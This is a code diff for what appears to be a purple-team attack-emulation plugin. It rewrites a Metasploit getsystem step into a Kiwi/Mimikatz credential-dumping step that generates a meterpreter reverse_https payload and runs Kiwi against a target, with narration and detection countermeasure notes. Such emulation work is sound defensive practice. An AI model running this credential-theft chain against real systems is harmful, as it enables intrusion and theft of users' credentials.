@@ -6,13 +6,13 @@ from plugins.base.attack import AttackPlugin, Requirement
 import socket
 
 
-class MetasploitGetsystemPlugin(AttackPlugin):
+class MetasploitKiwiPlugin(AttackPlugin):
 
     # Boilerplate
-    name = "metasploit_getsystem"
-    description = "Privilege elevation via metasploit getsystem"
-    ttp = "????"
-    references = ["https://docs.rapid7.com/metasploit/meterpreter-getsystem/"]
+    name = "metasploit_kiwi"
+    description = "Extract credentials from memory. Kiwi is the more modern Mimikatz"
+    ttp = "t1003"
+    references = ["https://www.hackers-arise.com/post/2018/11/26/metasploit-basics-part-21-post-exploitation-with-mimikatz"]
 
     required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
 
@@ -28,7 +28,7 @@ class MetasploitGetsystemPlugin(AttackPlugin):
         @param targets: A list of targets, ip addresses will do
         """
 
-        self.attack_logger.start_narration("A metasploit command like that is used to get system privileges for the next attack step.")
+        self.attack_logger.start_narration("Extracting user credentials from memory.")
         res = ""
         payload_type = "windows/x64/meterpreter/reverse_https"
         payload_name = "babymetal.exe"
@@ -44,12 +44,10 @@ class MetasploitGetsystemPlugin(AttackPlugin):
                                      format="exe",
                                      outfile=payload_name)
 
-        # TODO: https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/elevate.c#L70
-
-        self.metasploit.getsystem(target,
-                                  variant=self.conf['variant'],
-                                  situation_description="This is an example standalone attack step. In real world attacks there would be events before and after",
-                                  countermeasure="Observe how pipes are used. Take steps before (gaining access) and after (abusing those new privileges) into account for detection."
-                                  )
+        self.metasploit.kiwi(target,
+                             variant=self.conf['variant'],
+                             situation_description="Kiwi is the modern version of mimikatz. It is integrated into metasploit. The attacker wants to get some credentials - reading them from memory.",
+                             countermeasure="Memory access into critical processes should be monitored."
+                             )
 
         return res
